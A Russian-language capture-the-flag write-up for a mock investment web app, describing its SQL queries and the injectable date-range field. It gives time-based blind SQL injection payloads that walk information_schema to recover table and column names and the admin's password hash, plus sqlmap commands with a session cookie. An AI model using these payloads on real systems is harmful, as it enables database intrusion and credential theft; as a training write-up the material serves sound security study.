31337 investments:
Есть логин с двумя полями - имя и пароль. Это заглушка, при нажатии всегда "неверный логин или пароль".
Доступны 4 функции:
Пополнить баланс, Снять деньги, Доходность счета за период, История транзакций за период.
Внутри есть 2 таблицы: users, transact.
В users 3 колонки: id, login, password.
В transact их 6: id, user, value, percent, date.
Задача: увести пароль админа.
Баланс: SELECT SUM(value) as sum FROM `transact` WHERE `user`='asd'
Пополнить баланс: alert('отправьте на биткон кошелек')
Снять деньги: alert('извините, нельзя').
История счета за период с x, по y: ползунок(jquery) и кнопка "показать"
Доходность: SELECT SUM(value) as sum FROM `transact` WHERE `user`='user' AND (`date` BEETWEEN x AND y)
Транзакции: SELECT * FROM `transact` WHERE `user`='user' AND (`date` BEETWEEN x AND y)

Таким образом в диапозон дат можно засунуть инъекцию.
Казалось бы, доходноть на страницу выводится, да и сами транзакции тоже - поэтому это не слепая инъекция, ведь мы видим результат запроса. Но, из-за того, что запроса к БД 2, и в них разное количество колонок, то union injection обречен на ошибку, а раз ошибка, то ничего выводится не будет.
================================================================================

Как хакать:
sql injection в поле диапозона дат.
Уязвимый запрос:
SELECT SUM(value) FROM `transact` WHERE `user`='admin' AND `date` BETWEEN '' AND 'injection_here' AND SELECT ...-- 

Начинаем раскручивать, вместо ... постепенно вставляем такие запросы:
1) бинарным поиском ищем названия таблиц, меняя ascii номер и в limit указывая какую по счету таблицу подбираем.
if(ascii(substring((SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<110, sleep(5), null)-- 
2) зная имя таблицы `hamsters` можно угадать, что внутри нее есть колонки id, user, pass. но можно и их пробрутить:
if(ascii(substring((SELECT column_name from information_schema.columns where table_schema=database() and table_name='hamsters' limit 0,1),1,1))<110, sleep(5), null)-- 
3) зная имена колонок можно догадаться, что id админа первый, или что user у него 'admin'. теперь брутим его md5
if(ascii(substring((SELECT `pass` from `hamsters` where `user`='admin' limit 0,1),1,1))<110, sleep(5), null)-- 
4) md5 и будет флагом

python2 sqlmap.py -u http://olymp.ructf.org:8080/ --cookie="PHPSESSID=u9r6jr7u9jlvf5r6nkct3o5v33" --forms -p to
python2 sqlmap.py -u http://olymp.ructf.org:8080/ --cookie="PHPSESSID=u9r6jr7u9jlvf5r6nkct3o5v33" --forms -p to --dbms=MySQL --current-db